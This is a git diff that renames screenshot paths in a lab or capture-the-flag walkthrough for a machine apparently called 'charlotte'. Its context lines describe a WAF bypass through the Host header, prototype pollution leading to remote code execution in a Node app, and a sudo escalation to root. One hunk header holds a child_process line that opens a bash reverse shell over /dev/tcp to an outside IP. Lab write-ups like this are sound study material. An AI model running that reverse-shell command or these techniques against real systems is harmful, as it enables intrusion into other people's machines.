@@ -70,11 +70,11 @@ const pass = process.env.DEATH_STAR_PASSWORD
 
 Port 80 hosted a basic page with a login:
 
-![](<../../../.gitbook/assets/image%20(2123).png>)
+![](../../../.gitbook/assets/charlotte-5.png)
 
 Port 8000 required credentials to view, and its likely that the source code we found in the NFS shares was for the port 8000 website.
 
-![](<../../../.gitbook/assets/image%20(3750).png>)
+![](../../../.gitbook/assets/charlotte-9.png)
 
 I first did a `feroxbuster` scan on the port 80 website, since we couldn't do anything without the credentials for the port 8000 website.
 
@@ -173,15 +173,15 @@ if ($prerender = 1) {
 
 The `$host` parameter is user-controlled, and can be altered. Fittingly, attempts to visit the `/admin` directory are blocked by a WAF:
 
-![](<../../../.gitbook/assets/image%20(3406).png>)
+![](../../../.gitbook/assets/charlotte-8.png)
 
 This can be bypassed by setting the `Host` header to `localhost` since the Nginx configuration uses our `$host` values:
 
-![](<../../../.gitbook/assets/image%20(2845).png>)
+![](../../../.gitbook/assets/charlotte-6.png)
 
 With this, we can login and view the port 8000 service.
 
-![](<../../../.gitbook/assets/image%20(1765).png>)
+![](../../../.gitbook/assets/charlotte-3.png)
 
 ### Prototype Pollution -> RCE
 
@@ -229,7 +229,7 @@ app.post("/change_status", (req, res) => {
 
 I tried interacting with the application and injecting some other JSON data:
 
-![](<../../../.gitbook/assets/image%20(1540).png>)
+![](../../../.gitbook/assets/charlotte-2.png)
 
 The RCE exploit lies in overwriting `outputFunctionName`. When researching for how to exploit this, I came across this article:
 
@@ -259,7 +259,7 @@ Content-Length: 165
 
 It didn't work at first, and upon sending a GET request to `/reset`, it worked!
 
-![](<../../../.gitbook/assets/image%20(2902).png>)
+![](../../../.gitbook/assets/charlotte-7.png)
 
 ## Privilege Escalation
 
@@ -320,10 +320,10 @@ require('child_process').exec("bash -c 'bash -i >& /dev/tcp/192.168.45.208/80 0>
 
 Then, we can just wait for the shell to execute.
 
-![](<../../../.gitbook/assets/image%20(1771).png>)
+![](../../../.gitbook/assets/charlotte-4.png)
 
 The user is part of the `sudo` group, and it is trivial to become the `root` user:
 
-![](<../../../.gitbook/assets/image%20(1360).png>)
+![](../../../.gitbook/assets/charlotte-1.png)
 
 Rooted!
